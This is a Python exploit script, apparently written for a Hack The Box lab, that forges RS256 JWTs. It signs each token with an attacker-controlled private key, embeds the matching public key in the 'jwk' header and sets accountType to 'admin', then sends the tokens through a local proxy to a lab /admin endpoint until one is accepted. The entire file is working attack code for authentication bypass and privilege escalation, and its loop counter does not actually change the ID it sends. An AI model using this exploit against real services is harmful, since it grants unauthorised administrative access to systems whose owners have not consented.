import requests
import string
import re
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# Global variables
TARGET_URL = 'http://94.237.54.201:34708/admin'
VERIFY_RESPONSE = 200

def load_public_key(pem_file):
    with open(pem_file, 'rb') as f:
        public_key_pem = f.read()
    public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
    return public_key

def convert_pem_to_jwk(public_key):
    jwk_key = jwk.construct(public_key, algorithm='RS256')
    jwk_dict = jwk_key.to_dict()
    return jwk_dict

def load_private_key(pem_file):
    with open(pem_file, 'rb') as f:
        private_key_pem = f.read()
    return private_key_pem

def forge_jwt(jwt_payload, private_key_pem, jwk_dict):
    token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})
    return token

def send_request(session_token):
    headers = {
        'Host': '94.237.54.201:34708',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Referer': 'http://94.237.54.201:34708/profile',
        'Cookie': f'session={session_token}',
        'Upgrade-Insecure-Requests': '1',
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    response = requests.get(TARGET_URL, headers=headers, proxies=proxies, allow_redirects=False)
    return response

def main():
    # Load keys
    public_key = load_public_key('exploit_public.pem')
    private_key_pem = load_private_key('exploit_private.pem')
    
    # Convert PEM to JWK
    jwk_dict = convert_pem_to_jwk(public_key)
    
    # Initial payload
    jwt_payload = {
        "user": "htb-stdnt",
        "accountType": "admin",
        "id": 1234,
        "iat": 1729741109
    }
    
    id_counter = 1
    while True:
        # Update id in payload
        jwt_payload["id"] = 1234
        
        # Forge JWT
        session_token = forge_jwt(jwt_payload, private_key_pem, jwk_dict)
        
        # Send request
        response = send_request(session_token)
        
        if response.status_code == VERIFY_RESPONSE:
            print(f"Success with ID {id_counter}: {session_token}")
            break
        else:
            print(f"Attempt with ID {id_counter} failed")
        
        id_counter += 1

if __name__ == "__main__":
    main()
